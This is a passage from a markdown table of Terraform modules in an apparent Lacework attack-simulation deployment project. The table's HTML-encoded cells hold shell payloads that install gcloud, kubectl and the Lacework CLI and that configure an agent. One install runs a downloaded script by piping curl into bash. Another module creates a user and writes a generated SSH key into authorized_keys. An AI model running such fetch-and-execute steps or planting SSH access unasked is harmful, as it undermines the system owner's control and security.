base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| target-osconfig-deploy-lacework-code-aware-agent        | ./modules/osconfig/deploy-lacework-code-aware-agent   | osconfig_deploy_lacework_code_aware_agent       | context.gcp.osconfig.deploy_lacework_code_aware_agent            | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "deploy_lacework_code_aware_agent": {<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-code-aware-agent   | <pre>locals &&#35;123;<br/>    tool = &quot;lacework&#45;codeware&#45;agent&quot;<br/>    lacework&&#35;95;install&&#35;95;path = &quot;/var/lib/lacework&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    LACEWORK&&#35;95;INSTALL&&#35;95;PATH=&quot;$&&#35;123;local&#46;lacework&&#35;95;install&&#35;95;path&&#35;125;&quot;  <br/>    <br/>    &#35; Check if Lacework is pre&#45;installed&#46; If installed, add code aware agent config&#46;<br/>    if &&#35;91; &#45;f &quot;$LACEWORK&&#35;95;INSTALL&&#35;95;PATH/datacollector&quot; &&#35;93;; then<br/>        log &quot;Lacework agent is installed, adding code aware agent config&#46;&#46;&#46;&quot;<br/>        file&&#35;95;path=&quot;/var/lib/lacework/config/config&#46;json&quot;<br/>        <br/>        log &quot;Checking for codeaware agent config enable&#46;&#46;&#46;&quot;<br/>        grep &#45;q &&#35;x27;&quot;codeaware&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;:&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&&#35;123;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&quot;enable&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;:&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&quot;all&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&&#35;125;&&#35;x27; $file&&#35;95;path<br/>        if &&#35;91; $? &#45;ne 0 &&#35;93;; then<br/>            log &quot;Code aware agent not currently enabled&#46;&#46;&#46;&quot;<br/>            grep &#45;q &&#35;x27;&quot;codeaware&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;:&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&&#35;123;&&#35;91;^&&#35;125;&&#35;93;&&#35;42;&&#35;125;&&#35;x27; $file&&#35;95;path<br/>            if &&#35;91; $? &#45;eq 0 &&#35;93;; then<br/>                log &quot;Found existing codeaware config &#45; updating&#46;&#46;&#46;&quot;<br/>                sed &#45;i &&#35;x27;s/&quot;codeaware&quot;&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;:&&#35;91;&&#35;91;:space:&&#35;93;&&#35;93;&&#35;42;&&#35;123;&&#35;91;^&&#35;125;&&#35;93;&&#35;42;&&#35;125;/&quot;codeaware&quot;: &&#35;123;&quot;enable&quot;: &quot;all&quot;&&#35;125;/&&#35;x27; $file&&#35;95;path<br/>            else<br/>                log &quot;No existing codeaware config &#45; appending&#46;&#46;&#46;&quot;<br/>                sed &#45;i &&#35;x27;1s/&&#35;123;/&&#35;123;&&#35;92;n  &quot;codeaware&quot;: &&#35;123;&quot;enable&quot;: &quot;all&quot;&&#35;125;,/&&#35;x27; $file&&#35;95;path<br/>            fi<br/>        else<br/>            log &quot;Code aware agent config already enabled&#46;&quot;<br/>        fi<br/>    fi<br/>    log &quot;Done&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        while &#33; &&#35;91; &#45;f /var/lib/lacework/config/config&#46;json &&#35;93;; do<br/>            log &quot;lacework installation not found &#45; waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        while &#33; &&#35;91; &#45;f /var/lib/lacework/config/config&#46;json &&#35;93;; do<br/>            log &quot;lacework installation not found &#45; waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| target-osconfig-deploy-gcp-cli                          | ./modules/osconfig/deploy-gcp-cli                     | osconfig_deploy_gcp_cli                         | context.gcp.osconfig.deploy_gcp_cli                              | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "deploy_gcp_cli": {<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-gcp-cli                     | <pre>locals &&#35;123;<br/>    tool = &quot;gcloud&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;Checking for $&&#35;123;local&#46;tool&&#35;125;&#46;&#46;&#46;&quot;<br/>    if &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>        log &quot;$&&#35;123;local&#46;tool&&#35;125; not found installation required&quot;<br/>    fi<br/>    log &quot;$&&#35;123;local&#46;tool&&#35;125; path: $&&#35;40;command &#45;v  $&&#35;123;local&#46;tool&&#35;125;&&#35;41;&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        &#35; install gcloud<br/>        curl https://dl&#46;google&#46;com/dl/cloudsdk/channels/rapid/downloads/google&#45;cloud&#45;cli&#45;416&#46;0&#46;0&#45;linux&#45;x86&&#35;95;64&#46;tar&#46;gz &#45;LOJ &&#35;92;<br/>            &amp;&amp; tar &#45;xf google&#45;cloud&#45;cli&#45;416&#46;0&#46;0&#45;linux&#45;x86&&#35;95;64&#46;tar&#46;gz &&#35;92;<br/>            &amp;&amp; &#46;/google&#45;cloud&#45;sdk/install&#46;sh &#45;q<br/>        cat &gt;&gt; /etc/profile&#46;d/gcloud &lt;&lt;EOF<br/>        PATH=$PATH:/google&#45;cloud&#45;sdk/bin<br/>        EOF<br/>        gcloud components install gke&#45;gcloud&#45;auth&#45;plugin &#45;&#45;quiet<br/>        EOT<br/>        apt&&#35;95;packages = &quot;jq&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        &#35; install gcloud<br/>        curl https://dl&#46;google&#46;com/dl/cloudsdk/channels/rapid/downloads/google&#45;cloud&#45;cli&#45;416&#46;0&#46;0&#45;linux&#45;x86&&#35;95;64&#46;tar&#46;gz &#45;LOJ &&#35;92;<br/>            &amp;&amp; tar &#45;xf google&#45;cloud&#45;cli&#45;416&#46;0&#46;0&#45;linux&#45;x86&&#35;95;64&#46;tar&#46;gz &&#35;92;<br/>            &amp;&amp; &#46;/google&#45;cloud&#45;sdk/install&#46;sh &#45;q<br/>        cat &gt;&gt; /etc/profile&#46;d/gcloud &lt;&lt;EOF<br/>        PATH=$PATH:/google&#45;cloud&#45;sdk/bin<br/>        EOF<br/>        gcloud components install gke&#45;gcloud&#45;auth&#45;plugin &#45;&#45;quiet<br/>        EOT<br/>        yum&&#35;95;packages = &quot;jq&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| target-osconfig-deploy-lacework-cli                     | ./modules/osconfig/deploy-lacework-cli                | osconfig_deploy_lacework_cli                    | context.gcp.osconfig.deploy_lacework_cli                         | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "deploy_lacework_cli": {<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-cli                | <pre>locals &&#35;123;<br/>    tool=&quot;lacework&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;Checking for $&&#35;123;local&#46;tool&&#35;125;&#46;&#46;&#46;&quot;<br/>    if &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125;; then<br/>        log &quot;$&&#35;123;local&#46;tool&&#35;125; not found installation required&quot;<br/>        curl https://raw&#46;githubusercontent&#46;com/lacework/go&#45;sdk/main/cli/install&#46;sh &#124; bash<br/>    fi<br/>    log &quot;$&&#35;123;local&#46;tool&&#35;125; path: $&&#35;40;command &#45;v  $&&#35;123;local&#46;tool&&#35;125;&&#35;41;&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt&&#35;95;packages = &quot;jq&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum&&#35;95;packages = &quot;jq&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| target-osconfig-deploy-kubectl-cli                      | ./modules/osconfig/deploy-kubectl-cli                 | osconfig_deploy_kubectl_cli                     | context.gcp.osconfig.deploy_kubectl_cli                          | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "deploy_kubectl_cli": {<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-kubectl-cli                 | <pre>locals &&#35;123;<br/>    tool=&quot;kubectl&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;Checking for $&&#35;123;local&#46;tool&&#35;125;&#46;&#46;&#46;&quot;<br/>    if &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125;; then<br/>        log &quot;$&&#35;123;local&#46;tool&&#35;125; not found installation required&quot;<br/>        curl &#45;LO &quot;https://storage&#46;googleapis&#46;com/kubernetes&#45;release/release/$&&#35;40;curl &#45;s https://storage&#46;googleapis&#46;com/kubernetes&#45;release/release/stable&#46;txt&&#35;41;/bin/linux/amd64/kubectl&quot;<br/>        sudo install &#45;o root &#45;g root &#45;m 0755 kubectl /usr/local/bin/kubectl<br/>    fi<br/>    log &quot;$&&#35;123;local&#46;tool&&#35;125; path: $&&#35;40;command &#45;v  $&&#35;123;local&#46;tool&&#35;125;&&#35;41;&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt&&#35;95;packages = &quot;jq&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        if command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; found &#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum&&#35;95;packages = &quot;jq&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| target-ssh-keys                                         | ./modules/osconfig/deploy-ssh-keys                    | osconfig_deploy_secret_ssh_public               | context.gcp.osconfig.ssh_keys                                    | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "ssh_keys": {<br/>                    "enabled": false,<br/>                    "ssh_authorized_keys_path": "/home/sshuser/.ssh/authorized_keys",<br/>                    "ssh_private_key_path": "/home/sshuser/.ssh/secret_key",<br/>                    "ssh_public_key_path": "/home/sshuser/.ssh/secret_key.pub"<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-keys                    | <pre>&#35; ssh key<br/>resource &quot;tls&&#35;95;private&&#35;95;key&quot; &quot;ssh&quot; &&#35;123;<br/>  algorithm = &quot;RSA&quot;<br/>  rsa&&#35;95;bits  = &quot;4096&quot;<br/>&&#35;125;<br/><br/>locals &&#35;123;<br/>    ssh&&#35;95;private&&#35;95;key = base64encode&&#35;40;tls&&#35;95;private&&#35;95;key&#46;ssh&#46;private&&#35;95;key&&#35;95;pem&&#35;41;<br/>    ssh&&#35;95;private&&#35;95;key&&#35;95;path = var&#46;inputs&&#35;91;&quot;ssh&&#35;95;private&&#35;95;key&&#35;95;path&quot;&&#35;93;<br/>    ssh&&#35;95;public&&#35;95;key = base64encode&&#35;40;chomp&&#35;40;tls&&#35;95;private&&#35;95;key&#46;ssh&#46;public&&#35;95;key&&#35;95;openssh&&#35;41;&&#35;41;<br/>    ssh&&#35;95;public&&#35;95;key&&#35;95;path = var&#46;inputs&&#35;91;&quot;ssh&&#35;95;public&&#35;95;key&&#35;95;path&quot;&&#35;93;<br/>    ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path = var&#46;inputs&&#35;91;&quot;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&quot;&&#35;93;<br/>    public&&#35;95;key&&#35;95;user = split&&#35;40;&quot;/&quot;, local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;41;&&#35;91;1&&#35;93; == &quot;root&quot; ? &quot;root&quot; : split&&#35;40;&quot;/&quot;, local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;41;&&#35;91;2&&#35;93;<br/>    private&&#35;95;key&&#35;95;user = split&&#35;40;&quot;/&quot;, local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;41;&&#35;91;1&&#35;93; == &quot;root&quot; ? &quot;root&quot; : split&&#35;40;&quot;/&quot;, local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;41;&&#35;91;2&&#35;93;<br/><br/>    payload&&#35;95;public = &lt;&lt;&#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating public key: $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125;&quot;<br/>    log &quot;adding user: $&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125;&#46;&#46;&#46;&quot;<br/>    adduser &#45;&#45;gecos &quot;&quot; &#45;&#45;disabled&#45;password &quot;$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125;&quot; &#124;&#124; log &quot;$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125; user already exists&quot;<br/>    mkdir &#45;p $&&#35;123;dirname&&#35;40;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;41;&&#35;125;<br/>    chown &#45;R $&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125;:$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125; $&&#35;123;dirname&&#35;40;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;41;&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64decode&&#35;40;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;41;&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64decode&&#35;40;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;41;&&#35;125;&&#35;x27; &gt;&gt; $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;<br/>    sort $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125; &#124; uniq &gt; $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;&#46;uniq<br/>    mv $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;&#46;uniq $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;<br/>    chmod 600 $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125; $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;<br/>    chown &#45;R 